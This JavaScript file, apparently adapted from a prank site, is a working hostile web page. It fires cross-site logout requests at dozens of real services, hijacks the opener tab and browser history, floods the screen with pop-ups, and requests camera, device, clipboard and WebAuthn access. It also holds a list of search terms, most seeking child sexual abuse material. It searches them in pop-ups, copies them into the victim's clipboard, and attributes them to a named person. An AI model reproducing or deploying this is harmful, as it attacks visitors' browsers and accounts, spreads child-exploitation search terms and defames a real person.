// like 99% of this code is taken from theannoyingsite, i jus changed some stuff

const logouts = {
    AOL: ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
    'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
    Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
    Blogger: ['GET', 'https://www.blogger.com/logout.g'],
    Delicious: ['GET', 'https://www.delicious.com/logout'], // works!
    DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
    DreamHost: ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
    Dropbox: ['GET', 'https://www.dropbox.com/logout'],
    eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
    Gandi: ['GET', 'https://www.gandi.net/login/out'],
    GitHub: ['GET', 'https://github.com/logout'],
    GMail: ['GET', 'https://mail.google.com/mail/?logout'],
    Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
    Hulu: ['GET', 'https://secure.hulu.com/logout'],
    Instapaper: ['GET', 'https://www.instapaper.com/user/logout'],
    Linode: ['GET', 'https://manager.linode.com/session/logout'],
    LiveJournal: ['POST', 'https://www.livejournal.com/logout.bml', { 'action:killall': '1' }],
    MySpace: ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
    NetFlix: ['GET', 'https://www.netflix.com/Logout'],
    'New York Times': ['GET', 'https://www.nytimes.com/logout'],
    Newegg: ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
    Photobucket: ['GET', 'https://photobucket.com/logout'],
    Skype: ['GET', 'https://secure.skype.com/account/logout'],
    Slashdot: ['GET', 'https://slashdot.org/my/logout'],
    SoundCloud: ['GET', 'https://soundcloud.com/logout'],
    'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
    'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
    ThinkGeek: ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
    Threadless: ['GET', 'https://www.threadless.com/logout'],
    Tumblr: ['GET', 'https://www.tumblr.com/logout'],
    Vimeo: ['GET', 'https://vimeo.com/log_out'],
    Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
    'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
    Woot: ['GET', 'https://account.woot.com/logout'],
    Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
    Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
    YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
}

const nathatpastelsearchhistory = [
    "little girl porn",
    "little girl stretching",
    "antifa porn",
    "little girls in swimwear",
    "little girls rape porn",
    "girl school shooter porn",
    "ghetto hispanic porn",
    "nudism little girls",
    "six year old girl pussy",
    "little girl pussy",
    "hiv positive porn",
    "rape porn choking",
    "asian nudist little girl",
    "school shooter porn",
    "little girls kissing",
    "midget porn",
    "tomboy porn",
    "little girls chest",
    "little girls masturbating",
    "high school porn",
    "virgin christian girl porn",
    "little girls sucking banana",
    "13 year old asian girl",
    "little girls asses",
    "12 year olds twerking",
    "christian porn",
    "little teens porn",
    "asian teen porn",
    "little girls with chokers porn"
]

const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const MARGIN = 15
const TOP_MARGIN = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const wins = []

let interactions = 0
let iFrameNum = 0

function interceptUserInput(func) {
    document.body.addEventListener("touchstart", func, { passive: false })
    document.body.addEventListener("mousedown", func)
    document.body.addEventListener("mouseup", func)
    document.body.addEventListener("click", func)
    document.body.addEventListener("keydown", func)
    document.body.addEventListener("keyup", func)
    document.body.addEventListener("keypress", func)
}

function getRandomCoords() {
    null
    const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - 480 - MARGIN))
    const y = TOP_MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - 360 - TOP_MARGIN))
    return { x, y }
}

function onCloseWindow(win) {
    const i = wins.indexOf(win)
    if (i >= 0) wins.splice(i, 1)
}

function setupSearchWindow(win) {
    if (!win) return
    const { x, y } = getRandomCoords()
    win.moveTo(x, y)
    win.resizeTo(480 * 2, 360 * 2)
    win.window.location = "https://www.google.com/search?q=" + encodeURIComponent(nathatpastelsearchhistory[0])
    let searchIndex = 1
    const interval = setInterval(() => {
        if (win.closed) {
            clearInterval(interval)
            onCloseWindow(win)
            return
        }

        win.window.location = window.location.pathname
        setTimeout(() => {
            win.resizeTo(480, 360)
        }, 500)
        setTimeout(() => {
            const { x, y } = getRandomCoords()
            win.moveTo(x, y)
            win.resizeTo(480 * 2, 360 * 2)
            win.window.location = "https://www.google.com/search?q=" + encodeURIComponent(nathatpastelsearchhistory[searchIndex])

            searchIndex += 1
            if (searchIndex >= nathatpastelsearchhistory.length) {
                searchIndex = 0
            }
        }, 1000)
    }, 3000)
}

function openWindow() {
    const { x, y } = getRandomCoords()
    const opts = `width=480,height=360,left=${x},top=${y}`
    const win = window.open(window.location.pathname, '', opts)
    if (!win) return
    wins.push(win)

    if (wins.length === 2) setupSearchWindow(win)
}

function logout() { // superlogout.com
    function cleanup(el, delayCleanup) {
        if (delayCleanup) {
            delayCleanup = false
            return
        }
        el.parentNode.removeChild(el)
    }

    function get(url) {
        const img = document.createElement("img")
        img.onload = img.onerror = () => cleanup(img)
        img.style = HIDDEN_STYLE
        document.body.appendChild(img)
        img.src = url
    }

    function post(url, params) {
        const iframe = document.createElement("iframe")
        iframe.style = HIDDEN_STYLE
        iframe.name = "iframe" + iFrameNum
        document.body.appendChild(iframe)

        iFrameNum += 1

        const form = document.createElement("form")
        form.style = HIDDEN_STYLE

        let numLoads = 0
        iframe.onload = iframe.onerror = () => {
            if (numLoads >= 1) cleanup(iframe)
            numLoads += 1
        }

        form.action = url
        form.method = "POST"
        form.target = iframe.name

        for (const param in params) {
            if (Object.prototype.hasOwnProperty.call(params, param)) {
                const input = document.createElement("input")
                input.type = "hidden"
                input.name = param
                input.value = params[param]
                form.appendChild(input)
            }
        }

        document.body.appendChild(form)
        form.submit()
    }

    for (const name in logouts) {
        const method = logouts[name][0]
        const url = logouts[name][1]
        const params = logouts[name][2] || {}

        if (method === "GET") {
            get(url)
        } else {
            post(url, params)
        }
    }
}

function isParentSameOrigin() {
    try {
        return window.opener.location.origin === window.location.origin
    } catch (err) {
        return false
    }
}

function startVibrate() {
    if (typeof window.navigator.vibrate !== "function") return
    setInterval(() => {
        const duration = Math.floor(Math.random() * 600)
        window.navigator.vibrate(duration)
    }, 1000)

    window.addEventListener("gamepadconnected", event => {
        const gamepad = event.gamepad
        if (gamepad.vibrationActuator) {
            setInterval(() => {
                if (gamepad.connected) {
                    gamepad.vibrationActuator.playEffect("dual-rumble", {
                        duration: Math.floor(Math.random() * 600),
                        strongMagnitude: Math.random(),
                        weakMagnitude: Math.random()
                    })
                }
            }, 1000)
        }
    })
}

function getRandomArrayEntry(arr) {
    return arr[Math.floor(Math.random() * arr.length)]
}

function copyToClipboard(text) {
    const span = document.createElement("span")
    span.textContent = text
    span.style.whiteSpace = "pre"

    const iframe = document.createElement("iframe")
    iframe.sandbox = "allow-same-origin"
    document.body.appendChild(iframe)

    let win = iframe.contentWindow
    win.document.body.appendChild(span)

    let selection = win.getSelection()

    if (!selection) {
        win = window
        selection = win.getSelection()
        document.body.appendChild(span)
    }

    const range = win.document.createRange()
    selection.removeAllRanges()
    range.selectNode(span)
    selection.addRange(range)

    let success = false
    try {
        success = win.document.execCommand("copy")
    } catch { }

    selection.removeAllRanges()
    span.remove()
    iframe.remove()

    return success
}

function requestWebauthnAttestation() {
    try {
        // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
        // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses

        // sample arguments for registration
        const createCredentialDefaultArgs = {
            publicKey: {
                // Relying Party (a.k.a. - Service):
                rp: {
                    name: 'Acme'
                },

                // User:
                user: {
                    id: new Uint8Array(16),
                    name: 'nathatpastel@nathatpas.tel',
                    displayName: 'nathatpastel'
                },

                pubKeyCredParams: [{
                    type: 'public-key',
                    alg: -7
                }],

                attestation: 'direct',

                timeout: 60000,

                challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
                    0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
                    0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
                ]).buffer
            }
        }

        // sample arguments for login
        const getCredentialDefaultArgs = {
            publicKey: {
                timeout: 60000,
                // allowCredentials: [newCredential] // see below
                challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
                    0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
                    0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
                ]).buffer
            }
        }

        // register / create a new credential
        navigator.credentials.create(createCredentialDefaultArgs)
            .then((cred) => {
                // normally the credential IDs available for an account would come from a server
                // but we can just copy them from above...
                const idList = [{
                    id: cred.rawId,
                    transports: ['usb', 'nfc', 'ble'],
                    type: 'public-key'
                }]
                getCredentialDefaultArgs.publicKey.allowCredentials = idList
                return navigator.credentials.get(getCredentialDefaultArgs)
            })
    } catch { }
}

function requestPointerLock() {
    const requestPointerLockApi = (
        document.body.requestPointerLock ||
        document.body.webkitRequestPointerLock ||
        document.body.mozRequestPointerLock ||
        document.body.msRequestPointerLock
    )
    requestPointerLockApi.call(document.body)
}

function requestFullscreen() {
    const requestFullscreen = Element.prototype.requestFullscreen ||
        Element.prototype.webkitRequestFullscreen ||
        Element.prototype.mozRequestFullScreen ||
        Element.prototype.msRequestFullscreen

    requestFullscreen.call(document.body)
}

function requestClipboardRead() {
    try {
        navigator.clipboard.readText().then(
            data => {
                if (!window.ApplePaySession) {
                    window.alert(data)
                }
            },
            () => { }
        )
    } catch { }
}

function requestMidiAccess() {
    try {
        navigator.requestMIDIAccess({
            sysex: true
        })
    } catch { }
}

function requestBluetoothAccess() {
    try {
        navigator.bluetooth.requestDevice({
            acceptAllDevices: true
        }).then(device => device.gatt.connect())
    } catch { }
}

function requestUSBAccess() {
    try {
        navigator.usb.requestDevice({ filters: [{}] })
    } catch { }
}

function requestSerialAccess() {
    try {
        navigator.serial.requestPort({ filters: [] })
    } catch { }
}

function requestHIDAccess() {
    try {
        navigator.hid.requestDevice({ filters: [] })
    } catch { }
}

function requestCameraAndMicAccess() {
    if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== "function") return
    navigator.mediaDevices.enumerateDevices().then(devices => {
        const cameras = devices.filter((device) => device.kind === "videoinput")
        if (cameras.length === 0) return

        const camera = cameras[cameras.length - 1]

        navigator.mediaDevices.getUserMedia({
            deviceId: camera.deviceId,
            facingMode: ["user", "environment"],
            audio: true,
            video: true
        }).then(stream => {
            const track = stream.getVideoTracks()[0]
            const imageCapture = new window.ImageCapture(track)
            imageCapture.getPhotoCapabilities().then(() => {
                track.applyConstraints({ advanced: [{ torch: true }] })
            }, () => { })
        }, () => { })
    })
}

function registerProtocolHandlers() {
    if (typeof navigator.registerProtocolHandler !== "function") return

    const protocolWhitelist = [
        "bitcoin",
        "geo",
        "im",
        "irc",
        "ircs",
        "magnet",
        "mailto",
        "mms",
        "news",
        "ircs",
        "nntp",
        "sip",
        "sms",
        "smsto",
        "ssh",
        "tel",
        "urn",
        "webcal",
        "wtai",
        "xmpp"
    ]

    protocolWhitelist.forEach(proto => {
        navigator.registerProtocolHandler(proto, window.location.href + "/url=%s", "nathatpastel")
    })
}

function createAudio() {
    const audio = document.createElement("audio")
    audio.style = HIDDEN_STYLE

    const source = document.createElement("source")
    source.src = "djpedophile.mp3"
    source.type = "audio/mp3"

    document.body.appendChild(audio)
    audio.appendChild(source)
}

const isChildWindow = (window.opener && isParentSameOrigin()) ||
    window.location.search.indexOf('child=true') !== -1

function initialize() {
    window.addEventListener("beforeunload", event => {
        event.returnValue = true
    })

    interceptUserInput(event => {
        interactions += 1

        event.preventDefault()
        event.stopPropagation()

        if (event.which !== 0) openWindow()

        startVibrate()

        wins.forEach(win => {
            if (!win.closed) win.focus()
        })

        copyToClipboard(getRandomArrayEntry(nathatpastelsearchhistory))

        if (event.key === "Meta" || event.key === "Control") {
            window.print()
            requestWebauthnAttestation()
            window.print()
            requestWebauthnAttestation()
            window.print()
            requestWebauthnAttestation()
            window.print()
            requestWebauthnAttestation()
            window.print()
            requestWebauthnAttestation()
            window.print()
            requestWebauthnAttestation()
            window.print()
            requestWebauthnAttestation()
            window.print()
            requestWebauthnAttestation()
            window.print()
            requestWebauthnAttestation()
            window.print()
            requestWebauthnAttestation()
        }
        requestPointerLock()
        requestFullscreen()
        requestClipboardRead()
        requestMidiAccess()
        requestBluetoothAccess()
        requestUSBAccess()
        requestSerialAccess()
        requestHIDAccess()
        requestCameraAndMicAccess()
        if (Math.random() < 0.1) requestWebauthnAttestation()
    })
}

function initializeMain() {
    const template = document.querySelector("template")
    const clone = document.importNode(template.content, true)
    document.body.appendChild(clone)

    window.addEventListener("popstate", () => {
        window.history.forward()
    })

    for (let i = 1; i < 20; i++) {
        window.history.pushState({}, '', window.location.pathname + "?trolled=" + i)
    }
    window.history.pushState({}, window.location.pathname)

    createAudio()

    interceptUserInput(event => {
        if (interactions === 1) {
            document.querySelector("audio").play()

            registerProtocolHandlers()

            // cool targetblank vuln that i think is very cool
            if (!isChildWindow && window.opener && !isParentSameOrigin()) {
                window.opener.location = `${window.location.origin}/?child=true`
            }

            document.querySelector(".click-anywhere").remove()

            document.querySelector("html").style = "cursor: none;"

            audio.play()

            logout()
        }
    })
}

function initializeChild() {

}

initialize()

if (isChildWindow) {
    initializeChild()
} else {
    initializeMain()
}